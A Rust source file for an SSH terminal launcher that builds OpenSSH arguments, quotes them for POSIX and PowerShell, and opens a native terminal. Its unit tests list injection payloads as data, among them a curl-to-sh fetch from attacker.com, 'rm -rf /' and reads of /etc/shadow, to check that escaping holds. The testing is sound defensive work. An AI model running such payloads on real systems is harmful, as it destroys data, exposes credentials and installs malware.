use std::path::PathBuf;
use std::process::Command;

use crate::models::{BastionConfig, ConnectionProfile};

/// Résout les chemins commençant par `~/` vers le répertoire personnel de l'utilisateur.
pub fn resolve_home_path(path: &str) -> String {
    if let Some(stripped) = path.strip_prefix("~/") {
        if let Some(home) = dirs::home_dir() {
            return home.join(stripped).to_string_lossy().to_string();
        }
    }
    path.to_string()
}

/// Échappe les apostrophes simples pour l'injection sécurisée dans une commande shell POSIX `cd '...'`.
pub fn escape_single_quotes(path: &str) -> String {
    path.replace('\'', "'\\''")
}

/// Échappe un argument pour le shell POSIX en l'entourant d'apostrophes simples.
pub fn posix_quote(arg: &str) -> String {
    format!("'{}'", arg.replace('\'', "'\\''"))
}

/// Échappe un argument pour PowerShell en l'entourant d'apostrophes simples (`' -> ''`).
pub fn powershell_quote(arg: &str) -> String {
    format!("'{}'", arg.replace('\'', "''"))
}

#[derive(Debug, PartialEq, Eq)]
pub enum BastionRouting {
    JumpHost(String),
    ProxyCommand(String),
}

/// Construit la spécification Jump Host / ProxyCommand pour le bastion.
pub fn build_bastion_routing(
    bastion: &BastionConfig,
    all_profiles: &[ConnectionProfile],
) -> Result<Option<BastionRouting>, String> {
    if !bastion.enabled {
        return Ok(None);
    }

    let b_prof = bastion
        .profile_id
        .as_ref()
        .and_then(|id| all_profiles.iter().find(|p| p.id == *id));

    let host = bastion
        .host
        .as_deref()
        .or_else(|| b_prof.and_then(|p| p.host.as_deref()))
        .map(str::trim)
        .filter(|s| !s.is_empty())
        .ok_or_else(|| "Configuration de bastion invalide : aucun hôte spécifié".to_string())?;

    let user = bastion
        .username
        .as_deref()
        .or_else(|| b_prof.and_then(|p| p.username.as_deref()))
        .map(str::trim)
        .filter(|s| !s.is_empty());

    let port = bastion
        .port
        .or_else(|| b_prof.and_then(|p| p.port))
        .unwrap_or(22);

    let key_path = bastion
        .key_path
        .as_deref()
        .or_else(|| b_prof.and_then(|p| p.key_path.as_deref()))
        .map(str::trim)
        .filter(|s| !s.is_empty());

    // Encadrement des adresses IPv6 littérales
    let host_bracketed = if host.contains(':') && !host.starts_with('[') {
        format!("[{host}]")
    } else {
        host.to_string()
    };

    // Si une clé privée spécifique est requise pour le bastion, passer par ProxyCommand
    // OpenSSH développe les tokens `%h`, `%p`, etc. Les `%` littéraux dans les chemins/hôtes doivent être doublés (`%%`).
    if let Some(kp) = key_path {
        let resolved_key = resolve_home_path(kp);
        let escaped_key = escape_single_quotes(&resolved_key).replace('%', "%%");
        let target = match user {
            Some(u) => format!("{u}@{host_bracketed}"),
            None => host_bracketed,
        };
        let escaped_target = escape_single_quotes(&target).replace('%', "%%");
        let proxy_cmd = format!("ssh -W %h:%p -i '{escaped_key}' -p {port} {escaped_target}");
        return Ok(Some(BastionRouting::ProxyCommand(proxy_cmd)));
    }

    // Sinon, syntaxe standard OpenSSH Jump Host (-J [user@]host[:port])
    let mut spec = String::new();
    if let Some(u) = user {
        spec.push_str(u);
        spec.push('@');
    }
    spec.push_str(&host_bracketed);
    if port != 22 && port != 0 {
        spec.push(':');
        spec.push_str(&port.to_string());
    }

    Ok(Some(BastionRouting::JumpHost(spec)))
}

/// Construit la liste des arguments pour le binaire OpenSSH `ssh`.
pub fn build_ssh_args(
    profile: &ConnectionProfile,
    all_profiles: &[ConnectionProfile],
    remote_path: Option<&str>,
) -> Result<Vec<String>, String> {
    if profile.storage_type != "sftp" {
        return Err(
            "L'ouverture dans un terminal n'est supportée que pour les profils SFTP.".to_string(),
        );
    }

    let host = profile
        .host
        .as_deref()
        .map(str::trim)
        .filter(|s| !s.is_empty())
        .ok_or_else(|| "Hôte SFTP manquant".to_string())?;

    let port = profile.port.unwrap_or(22);

    let mut args = Vec::new();
    args.push("-p".to_string());
    args.push(port.to_string());

    if let Some(ref bastion) = profile.bastion {
        if let Some(routing) = build_bastion_routing(bastion, all_profiles)? {
            match routing {
                BastionRouting::JumpHost(spec) => {
                    args.push("-J".to_string());
                    args.push(spec);
                }
                BastionRouting::ProxyCommand(cmd) => {
                    args.push("-o".to_string());
                    args.push(format!("ProxyCommand={cmd}"));
                }
            }
        }
    }

    if let Some(ref kp) = profile.key_path {
        let trimmed = kp.trim();
        if !trimmed.is_empty() {
            let resolved = resolve_home_path(trimmed);
            args.push("-i".to_string());
            args.push(resolved);
        }
    }

    // Dans la syntaxe OpenSSH (ssh [options] [user@]hostname [command]),
    // les options (-t) DOIVENT obligatoirement précéder la cible (hostname).
    let has_remote_cmd = match remote_path {
        Some(path) if !path.is_empty() => {
            args.push("-t".to_string());
            true
        }
        _ => false,
    };

    let target = match profile
        .username
        .as_deref()
        .map(str::trim)
        .filter(|s| !s.is_empty())
    {
        Some(user) => format!("{user}@{host}"),
        None => host.to_string(),
    };
    args.push(target);

    // La commande distante suit le nom d'hôte cible.
    if has_remote_cmd {
        let path = remote_path.unwrap();
        let escaped_path = escape_single_quotes(path);
        args.push(format!("cd '{}' && exec $SHELL -l", escaped_path));
    }

    Ok(args)
}

/// Formate la ligne de commande avec un quoting strict POSIX pour les scripts shells / macOS.
pub fn format_posix_command_line(args: &[String]) -> String {
    let mut parts = vec!["ssh".to_string()];
    for arg in args {
        parts.push(posix_quote(arg));
    }
    parts.join(" ")
}

/// Formate la ligne de commande pour PowerShell sous Windows (évite l'interpolation locale de $SHELL).
pub fn format_powershell_command_line(args: &[String]) -> String {
    let quoted_args: Vec<String> = args.iter().map(|a| powershell_quote(a)).collect();
    format!("& ssh @({})", quoted_args.join(", "))
}

/// Cherche un exécutable dans la variable d'environnement PATH.
pub fn find_in_path(cmd: &str) -> Option<PathBuf> {
    let path_var = std::env::var_os("PATH")?;
    for dir in std::env::split_paths(&path_var) {
        let candidate = dir.join(cmd);
        if candidate.is_file() {
            return Some(candidate);
        }
        #[cfg(target_os = "windows")]
        {
            if !cmd.to_lowercase().ends_with(".exe") {
                let candidate_exe = dir.join(format!("{cmd}.exe"));
                if candidate_exe.is_file() {
                    return Some(candidate_exe);
                }
            }
        }
    }
    None
}

/// Lance le terminal externe selon le système d'exploitation de l'hôte.
pub fn launch_terminal(
    profile: &ConnectionProfile,
    all_profiles: &[ConnectionProfile],
    remote_path: Option<&str>,
) -> Result<(), String> {
    let ssh_args = build_ssh_args(profile, all_profiles, remote_path)?;

    #[cfg(target_os = "macos")]
    {
        launch_macos(&ssh_args)
    }

    #[cfg(target_os = "windows")]
    {
        launch_windows(profile, &ssh_args, remote_path.is_some())
    }

    #[cfg(not(any(target_os = "macos", target_os = "windows")))]
    {
        launch_linux(&ssh_args)
    }
}

// ---------------------------------------------------------------------------
// Adaptateur macOS
// ---------------------------------------------------------------------------
#[cfg(target_os = "macos")]
fn launch_macos(ssh_args: &[String]) -> Result<(), String> {
    let iterm_available = PathBuf::from("/Applications/iTerm.app").exists()
        || dirs::home_dir()
            .map(|h| h.join("Applications/iTerm.app").exists())
            .unwrap_or(false);

    let posix_cmd = format_posix_command_line(ssh_args);

    // Méthode 1 (Privilégiée) : Lancement natif via script .command avec `open`
    // Cette approche évite l'erreur AppleEvents -1743 (TCC / Privacy Automation)
    let temp_dir = std::env::temp_dir();
    let now = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_nanos())
        .unwrap_or(0);
    let script_filename = format!("orbit-ssh-{}-{now}.command", std::process::id());
    let script_path = temp_dir.join(script_filename);

    let script_content = format!(
        "#!/bin/sh\n\
        rm -f \"$0\"\n\
        {posix_cmd}\n\
        STATUS=$?\n\
        if [ $STATUS -ne 0 ]; then\n\
            echo \"\"\n\
            echo \"La commande SSH s'est terminée avec le code $STATUS.\"\n\
            echo \"Appuyez sur Entrée pour fermer cette fenêtre...\"\n\
            read -r _\n\
        fi\n"
    );

    // O_CREAT | O_EXCL via create_new(true) empêche formellement de suivre un lien symbolique préexistant
    #[cfg(unix)]
    {
        use std::fs::OpenOptions;
        use std::io::Write;
        use std::os::unix::fs::OpenOptionsExt;

        let mut file = OpenOptions::new()
            .write(true)
            .create_new(true)
            .mode(0o700)
            .open(&script_path)
            .map_err(|e| format!("Impossible de créer le script temporaire pour Terminal: {e}"))?;

        file.write_all(script_content.as_bytes())
            .map_err(|e| format!("Impossible d'écrire dans le script temporaire: {e}"))?;
    }

    // Si iTerm2 est présent, tenter avec iTerm
    if iterm_available {
        if let Ok(mut child) = Command::new("open")
            .arg("-a")
            .arg("iTerm")
            .arg(&script_path)
            .spawn()
        {
            if let Ok(status) = child.wait() {
                if status.success() {
                    return Ok(());
                }
            }
        }
    }

    // Ouvrir avec Terminal.app via `open -a Terminal`
    if let Ok(mut child) = Command::new("open")
        .arg("-a")
        .arg("Terminal")
        .arg(&script_path)
        .spawn()
    {
        if let Ok(status) = child.wait() {
            if status.success() {
                return Ok(());
            }
        }
    }

    // Fallback `open <script>` (ouvre avec l'application par défaut pour .command)
    if let Ok(mut child) = Command::new("open").arg(&script_path).spawn() {
        if let Ok(status) = child.wait() {
            if status.success() {
                return Ok(());
            }
        }
    }

    // Méthode 2 : Fallback AppleScript si disponible et autorisé
    let escaped_cmd = posix_cmd.replace('\\', "\\\\").replace('"', "\\\"");
    let script = format!(
        "tell application \"Terminal\"\n\
            activate\n\
            do script \"{escaped_cmd}\"\n\
        end tell"
    );
    if let Ok(mut child) = Command::new("osascript").arg("-e").arg(&script).spawn() {
        if let Ok(status) = child.wait() {
            if status.success() {
                return Ok(());
            }
        }
    }

    Err("Impossible d'ouvrir le terminal sous macOS (échec de open et osascript).".to_string())
}

// ---------------------------------------------------------------------------
// Adaptateur Windows
// ---------------------------------------------------------------------------
#[cfg(target_os = "windows")]
fn launch_windows(
    profile: &ConnectionProfile,
    ssh_args: &[String],
    has_remote_path: bool,
) -> Result<(), String> {
    // Priorité 1 : Windows Terminal (`wt.exe -d . ssh ...`)
    let wt_found = find_in_path("wt").is_some()
        || dirs::data_local_dir()
            .map(|d| d.join("Microsoft\\WindowsApps\\wt.exe").exists())
            .unwrap_or(false);

    if wt_found {
        let mut cmd = Command::new("wt.exe");
        cmd.args(["-d", "."]).arg("ssh").args(ssh_args);
        if cmd.spawn().is_ok() {
            return Ok(());
        }
    }

    // Priorité 2 : PuTTY (`putty.exe -ssh -P <port> -l <user> -i <key> <host>`)
    // NOTA : PuTTY ne supporte pas -J ni l'allocation de shell avec commande distante.
    // Si un bastion ou un dossier distant est requis, on bascule vers OpenSSH PowerShell.
    let bastion_active = profile.bastion.as_ref().map(|b| b.enabled).unwrap_or(false);
    if !bastion_active && !has_remote_path {
        let putty_candidates = [
            find_in_path("putty"),
            Some(PathBuf::from("C:\\Program Files\\PuTTY\\putty.exe")),
            Some(PathBuf::from("C:\\Program Files (x86)\\PuTTY\\putty.exe")),
        ];
        let putty_path = putty_candidates.into_iter().flatten().find(|p| p.exists());

        if let Some(putty_bin) = putty_path {
            let mut cmd = Command::new(putty_bin);
            cmd.arg("-ssh");
            let port = profile.port.unwrap_or(22);
            cmd.args(["-P", &port.to_string()]);

            if let Some(ref u) = profile.username {
                let trimmed = u.trim();
                if !trimmed.is_empty() {
                    cmd.args(["-l", trimmed]);
                }
            }

            if let Some(ref kp) = profile.key_path {
                let trimmed = kp.trim();
                if !trimmed.is_empty() {
                    cmd.args(["-i", &resolve_home_path(trimmed)]);
                }
            }

            if let Some(ref h) = profile.host {
                cmd.arg(h.trim());
            }

            if cmd.spawn().is_ok() {
                return Ok(());
            }
        }
    }

    // Fallback : PowerShell avec arguments littéraux (évite l'expansion locale de $SHELL)
    let ps_cmd = format_powershell_command_line(ssh_args);
    if Command::new("powershell.exe")
        .args(["-NoExit", "-Command", &ps_cmd])
        .spawn()
        .is_ok()
    {
        return Ok(());
    }

    Err(
        "Impossible de lancer un terminal compatible sous Windows (Windows Terminal, PuTTY ou PowerShell requis)."
            .to_string(),
    )
}

// ---------------------------------------------------------------------------
// Adaptateur Linux & Unix
// ---------------------------------------------------------------------------
#[cfg(not(any(target_os = "macos", target_os = "windows")))]
fn launch_linux(ssh_args: &[String]) -> Result<(), String> {
    // 1. Variable $TERMINAL si définie
    if let Ok(term) = std::env::var("TERMINAL") {
        let trimmed = term.trim();
        if !trimmed.is_empty() {
            let opt = if trimmed.contains("xfce4-terminal") {
                "-x"
            } else {
                "-e"
            };
            if Command::new(trimmed)
                .arg(opt)
                .arg("ssh")
                .args(ssh_args)
                .spawn()
                .is_ok()
            {
                return Ok(());
            }
        }
    }

    // 2. Détection séquentielle des émulateurs courants
    let terminals = [
        "x-terminal-emulator",
        "gnome-terminal",
        "konsole",
        "kitty",
        "alacritty",
        "xfce4-terminal",
        "xterm",
    ];

    for term in terminals {
        if find_in_path(term).is_some() {
            let mut cmd = Command::new(term);
            match term {
                "gnome-terminal" => {
                    cmd.arg("--").arg("ssh").args(ssh_args);
                }
                "xfce4-terminal" => {
                    cmd.arg("-x").arg("ssh").args(ssh_args);
                }
                "kitty" => {
                    cmd.arg("ssh").args(ssh_args);
                }
                _ => {
                    cmd.arg("-e").arg("ssh").args(ssh_args);
                }
            }

            if cmd.spawn().is_ok() {
                return Ok(());
            }
        }
    }

    Err(
        "Aucun émulateur de terminal pris en charge n'a été détecté (x-terminal-emulator, gnome-terminal, konsole, kitty, alacritty, xfce4-terminal, xterm)."
            .to_string(),
    )
}

// ---------------------------------------------------------------------------
// Tests unitaires
// ---------------------------------------------------------------------------
#[cfg(test)]
mod tests {
    use super::*;

    fn create_dummy_profile(
        id: &str,
        storage_type: &str,
        host: Option<&str>,
        port: Option<u16>,
        user: Option<&str>,
        key_path: Option<&str>,
    ) -> ConnectionProfile {
        ConnectionProfile {
            id: id.to_string(),
            name: id.to_string(),
            storage_type: storage_type.to_string(),
            endpoint: None,
            bucket: None,
            region: None,
            access_key: None,
            host: host.map(String::from),
            port,
            username: user.map(String::from),
            auth_type: None,
            key_path: key_path.map(String::from),
            is_favorite: false,
            use_sudo: false,
            bastion: None,
            proxy: None,
        }
    }

    #[test]
    fn test_escape_single_quotes() {
        assert_eq!(escape_single_quotes("simple"), "simple");
        assert_eq!(escape_single_quotes("it's cool"), "it'\\''s cool");
        assert_eq!(escape_single_quotes("a'b'c"), "a'\\''b'\\''c");
    }

    #[test]
    fn test_posix_quote() {
        assert_eq!(posix_quote("normal"), "'normal'");
        assert_eq!(posix_quote("has space and $VAR"), "'has space and $VAR'");
        assert_eq!(posix_quote("has 'quote'"), "'has '\\''quote'\\'''");
    }

    #[test]
    fn test_powershell_quote() {
        assert_eq!(powershell_quote("normal"), "'normal'");
        assert_eq!(powershell_quote("has 'quote'"), "'has ''quote'''");
    }

    #[test]
    fn test_build_ssh_args_simple() {
        let prof = create_dummy_profile(
            "p1",
            "sftp",
            Some("example.com"),
            Some(22),
            Some("ubuntu"),
            None,
        );
        let args = build_ssh_args(&prof, &[], None).unwrap();
        assert_eq!(args, vec!["-p", "22", "ubuntu@example.com"]);
    }

    #[test]
    fn test_build_ssh_args_custom_port_and_key() {
        let prof = create_dummy_profile(
            "p2",
            "sftp",
            Some("192.168.1.100"),
            Some(2222),
            Some("admin"),
            Some("/tmp/test_key"),
        );
        let args = build_ssh_args(&prof, &[], None).unwrap();
        assert_eq!(
            args,
            vec!["-p", "2222", "-i", "/tmp/test_key", "admin@192.168.1.100"]
        );
    }

    #[test]
    fn test_build_ssh_args_with_remote_path_order_and_whitespace() {
        let prof = create_dummy_profile(
            "p3",
            "sftp",
            Some("server.org"),
            Some(22),
            Some("deploy"),
            None,
        );
        // Doit préserver les espaces début/fin sans trim
        let args = build_ssh_args(&prof, &[], Some(" /var/www/my app's folder ")).unwrap();
        // -t DOIT précéder la destination deploy@server.org
        assert_eq!(
            args,
            vec![
                "-p",
                "22",
                "-t",
                "deploy@server.org",
                "cd ' /var/www/my app'\\''s folder ' && exec $SHELL -l"
            ]
        );
    }

    #[test]
    fn test_build_ssh_args_inline_bastion_ipv6() {
        let mut prof = create_dummy_profile(
            "p4",
            "sftp",
            Some("target.internal"),
            Some(22),
            Some("root"),
            None,
        );
        prof.bastion = Some(BastionConfig {
            enabled: true,
            profile_id: None,
            host: Some("2001:db8::1".to_string()),
            port: Some(2200),
            username: Some("bastionuser".to_string()),
            auth_type: None,
            key_path: None,
            password: None,
            passphrase: None,
        });

        let args = build_ssh_args(&prof, &[], None).unwrap();
        assert_eq!(
            args,
            vec![
                "-p",
                "22",
                "-J",
                "bastionuser@[2001:db8::1]:2200",
                "root@target.internal"
            ]
        );
    }

    #[test]
    fn test_build_ssh_args_bastion_with_key_uses_proxy_command() {
        let mut prof = create_dummy_profile(
            "p5",
            "sftp",
            Some("target.internal"),
            Some(22),
            Some("root"),
            None,
        );
        prof.bastion = Some(BastionConfig {
            enabled: true,
            profile_id: None,
            host: Some("jump.example.com".to_string()),
            port: Some(2222),
            username: Some("jumpuser".to_string()),
            auth_type: Some("key".to_string()),
            key_path: Some("/tmp/jump_key".to_string()),
            password: None,
            passphrase: None,
        });

        let args = build_ssh_args(&prof, &[], None).unwrap();
        assert_eq!(
            args,
            vec![
                "-p",
                "22",
                "-o",
                "ProxyCommand=ssh -W %h:%p -i '/tmp/jump_key' -p 2222 jumpuser@jump.example.com",
                "root@target.internal"
            ]
        );
    }

    #[test]
    fn test_build_ssh_args_bastion_with_percent_in_key_path() {
        let mut prof = create_dummy_profile(
            "p5_percent",
            "sftp",
            Some("target.internal"),
            Some(22),
            Some("root"),
            None,
        );
        prof.bastion = Some(BastionConfig {
            enabled: true,
            profile_id: None,
            host: Some("jump%host.example.com".to_string()),
            port: Some(2222),
            username: Some("jumpuser".to_string()),
            auth_type: Some("key".to_string()),
            key_path: Some("/tmp/100%jump/key".to_string()),
            password: None,
            passphrase: None,
        });

        let args = build_ssh_args(&prof, &[], None).unwrap();
        assert_eq!(
            args,
            vec![
                "-p",
                "22",
                "-o",
                "ProxyCommand=ssh -W %h:%p -i '/tmp/100%%jump/key' -p 2222 jumpuser@jump%%host.example.com",
                "root@target.internal"
            ]
        );
    }

    #[test]
    fn test_build_ssh_args_invalid_bastion_returns_error() {
        let mut prof = create_dummy_profile(
            "p6",
            "sftp",
            Some("target.internal"),
            Some(22),
            Some("root"),
            None,
        );
        prof.bastion = Some(BastionConfig {
            enabled: true,
            profile_id: None,
            host: None,
            port: None,
            username: None,
            auth_type: None,
            key_path: None,
            password: None,
            passphrase: None,
        });

        let err = build_ssh_args(&prof, &[], None).unwrap_err();
        assert!(err.contains("Configuration de bastion invalide"));
    }

    #[test]
    fn test_build_ssh_args_rejects_s3() {
        let prof = create_dummy_profile("p7", "s3", Some("bucket"), None, None, None);
        let err = build_ssh_args(&prof, &[], None).unwrap_err();
        assert!(err.contains("SFTP"));
    }

    #[test]
    fn test_format_posix_command_line() {
        let args = vec![
            "-p".to_string(),
            "22".to_string(),
            "-t".to_string(),
            "user@target".to_string(),
            "cd '/var/log' && exec $SHELL -l".to_string(),
        ];
        let cmd = format_posix_command_line(&args);
        assert_eq!(
            cmd,
            "ssh '-p' '22' '-t' 'user@target' 'cd '\\''/var/log'\\'' && exec $SHELL -l'"
        );
    }

    #[test]
    fn test_format_powershell_command_line() {
        let args = vec![
            "-p".to_string(),
            "22".to_string(),
            "user@target".to_string(),
        ];
        let cmd = format_powershell_command_line(&args);
        assert_eq!(cmd, "& ssh @('-p', '22', 'user@target')");
    }

    // -----------------------------------------------------------------------
    // Tests de Sécurité Avancés (Injection, Fuzzing, Vulnérabilités Shell/OS)
    // -----------------------------------------------------------------------

    #[test]
    fn test_security_adversarial_remote_paths_injection() {
        let prof = create_dummy_profile(
            "sec1",
            "sftp",
            Some("server.corp"),
            Some(22),
            Some("secops"),
            None,
        );

        let attack_payloads = [
            // Command substitution
            "/var/log/`touch /tmp/pwned`",
            "/var/log/`id`",
            "/var/log/$(reboot)",
            "/var/log/$(curl -s http://attacker.com/malware | sh)",
            // Chained commands and operators
            "/var/log; rm -rf /",
            "/var/log && rm -rf ~",
            "/var/log || echo pwned",
            "/var/log | cat /etc/shadow",
            "/var/log & ping -c 1 127.0.0.1 &",
            // Redirections
            "/var/log > /dev/null",
            "/var/log < /etc/passwd",
            "/var/log >> /tmp/append",
            "/var/log 2>&1",
            // Variables and parameter expansion
            "/var/log/$HOME",
            "/var/log/${PATH}",
            "/var/log/$SHELL",
            "/var/log/$$",
            // Quotes, backslashes, metacharacters
            "/var/log/'single'\"double\"",
            "/var/log/test's folder/with spaces",
            "/var/log/\\;\\&\\|\\`\\$",
            // Newlines and carriage returns
            "/var/log\nrm -rf /",
            "/var/log\r\nreboot",
        ];

        for payload in attack_payloads {
            let args = build_ssh_args(&prof, &[], Some(payload)).expect("Should build args safely");

            // 1. Vérifier que chaque argument individuel est correctement POSIX-quoted et préserve fidèlement la valeur
            for arg in &args {
                let q = posix_quote(arg);
                assert!(q.starts_with('\''), "Must start with single quote");
                assert!(q.ends_with('\''), "Must end with single quote");
                // Décodage POSIX strict : strip quotes de début/fin et substitution de '\'' par '
                let inner = &q[1..q.len() - 1];
                let unquoted = inner.replace("'\\''", "'");
                assert_eq!(
                    &unquoted, arg,
                    "Decoded POSIX argument must match original value"
                );
            }

            // 2. Vérifier que la commande POSIX pour le script local ne contient aucun appel non échappé
            let posix_cmd = format_posix_command_line(&args);
            assert!(posix_cmd.starts_with("ssh "));

            // 3. Vérifier que la commande PowerShell n'utilise pas de syntaxe interpolée et préserve les valeurs
            let ps_cmd = format_powershell_command_line(&args);
            assert!(ps_cmd.starts_with("& ssh @("));
            assert!(ps_cmd.ends_with(')'));
            for arg in &args {
                let pq = powershell_quote(arg);
                assert!(pq.starts_with('\''));
                assert!(pq.ends_with('\''));
                let inner = &pq[1..pq.len() - 1];
                let unquoted = inner.replace("''", "'");
                assert_eq!(
                    &unquoted, arg,
                    "Decoded PowerShell argument must match original value"
                );
            }
        }
    }

    #[test]
    fn test_security_adversarial_profile_fields() {
        let malicious_profiles = [
            create_dummy_profile(
                "p_malicious_1",
                "sftp",
                Some("evil.com; rm -rf /"),
                Some(22),
                Some("user`whoami`"),
                Some("/tmp/key; touch /tmp/hacked"),
            ),
            create_dummy_profile(
                "p_malicious_2",
                "sftp",
                Some("$(reboot).corp"),
                Some(2222),
                Some("admin'$(calc)'"),
                None,
            ),
        ];

        for prof in &malicious_profiles {
            let args = build_ssh_args(prof, &[], None).unwrap();
            let posix_cmd = format_posix_command_line(&args);

            // Aucun métacaractère ne doit être libre hors de guillemets stricts
            assert!(!posix_cmd.contains("; rm -rf / "));
            assert!(!posix_cmd.contains("`whoami` "));

            let ps_cmd = format_powershell_command_line(&args);
            // Vérifier que PowerShell traite l'ensemble comme tableau littéral d'arguments
            assert!(ps_cmd.starts_with("& ssh @("));
        }
    }

    #[test]
    fn test_security_posix_quote_invariants() {
        // Teste diverses chaînes complexes et vérifie que posix_quote produit un littéral strict
        let test_cases = [
            "",
            "normal",
            " ",
            "   ",
            "\"double quotes\"",
            "'single quotes'",
            "'''",
            "$VAR ${VAR} $() `command`",
            "\\n \\r \\t \\0",
            "a'b\"c$d`e\\f;g&h|i<j>k",
        ];

        for case in test_cases {
            let quoted = posix_quote(case);
            assert!(quoted.starts_with('\''), "Must start with single quote");
            assert!(quoted.ends_with('\''), "Must end with single quote");
            let inner = &quoted[1..quoted.len() - 1];
            let unquoted = inner.replace("'\\''", "'");
            assert_eq!(
                &unquoted, case,
                "Decoded quoted string must round-trip exactly"
            );
        }
    }

    #[test]
    fn test_security_macos_temp_script_exclusive_creation() {
        // Vérifie que create_new(true) échoue si un fichier préexiste (protection contre symlink race)
        let unique_name = format!(
            "orbit-sec-test-{}-{}",
            std::process::id(),
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_nanos()
        );
        let isolated_dir = std::env::temp_dir().join(&unique_name);
        std::fs::create_dir_all(&isolated_dir).unwrap();
        let test_file = isolated_dir.join("test.command");

        struct DirCleanup(PathBuf);
        impl Drop for DirCleanup {
            fn drop(&mut self) {
                let _ = std::fs::remove_dir_all(&self.0);
            }
        }
        let _guard = DirCleanup(isolated_dir);

        // 1. Créer le fichier initialement avec create_new(true)
        let initial = std::fs::OpenOptions::new()
            .write(true)
            .create_new(true)
            .open(&test_file);
        assert!(
            initial.is_ok(),
            "Initial exclusive file creation must succeed"
        );

        // 2. Tenter d'ouvrir une seconde fois avec create_new(true)
        let second = std::fs::OpenOptions::new()
            .write(true)
            .create_new(true)
            .open(&test_file);

        // Doit échouer avec AlreadyExists
        assert!(
            second.is_err(),
            "create_new must fail if file already exists"
        );
        let err = second.unwrap_err();
        assert_eq!(err.kind(), std::io::ErrorKind::AlreadyExists);
    }
}
